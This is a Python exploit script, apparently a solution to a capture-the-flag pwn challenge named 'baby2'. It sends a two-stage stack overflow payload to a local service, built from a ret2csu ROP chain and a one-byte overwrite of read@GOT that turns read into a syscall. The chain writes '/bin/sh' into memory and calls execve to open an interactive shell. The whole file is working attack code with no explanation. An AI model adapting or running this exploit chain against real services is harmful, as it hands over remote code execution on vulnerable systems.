from ptrlib import *

elf = ELF("./baby2")
#libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
#sock = Socket("")
libc = ELF("/lib64/libc.so.6")
sock = Socket("127.0.0.1", 4001)
_ = input()

rop_pop_rsi_pop_r15 = 0x00400651
rop_pop_rdi = 0x00400653
rop_libc_csu_init = 0x0040064a
call_libc_csu_init = 0x00400630

plt_read = 0x400470
plt_libc_start_main = 0x400480
addr_binsh = elf.symbol("__bss_start") + 8

""" Stage 1 """
payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read")) # r12 --> call [r12]
payload += p64(8)               # r13 --> rdx
payload += p64(addr_binsh)      # r14 --> rsi
payload += p64(0)               # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read")) # r12 --> call [r12]
payload += p64(1)               # r13 --> rdx
payload += p64(elf.got("read")) # r14 --> rsi
payload += p64(0)               # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(0x400018)        # r12 --> call [r12]
payload += p64(0)               # r13 --> rdx
payload += p64(0)               # r14 --> rsi
payload += p64(0)               # r15 --> rdi

payload += p64(call_libc_csu_init)

payload = payload + b'\x00' * (0x12c - len(payload))

sock.send(payload)
sock.send('/bin/sh\x00')
sock.send(chr(0x6e))
dump("wrote '/bin/sh'")
dump("changed read@got")
dump("Stage 1: Done!")

""" Stage 2 """
addr_hyper_read = 0x4005dd
rop_pop_rbp = 0x00400510

payload = b'A' * 0x38

payload += p64(rop_pop_rbp)
payload += p64(addr_binsh + 8)


payload += p64(rop_libc_csu_init)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read")) # r12 --> call [r12]
payload += p64(59)              # r13 --> rdx
payload += p64(addr_binsh + 8)  # r14 --> rsi
payload += p64(0)               # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(elf.got("read")) # r12 --> call [r12]
payload += p64(0)               # r13 --> rdx
payload += p64(0)               # r14 --> rsi
payload += p64(addr_binsh)      # r15 --> rdi

payload += p64(call_libc_csu_init)

payload = payload + b'\x00' * (0x12c - len(payload))

sock.send(payload)
sock.send("A" * 59)

sock.interactive()
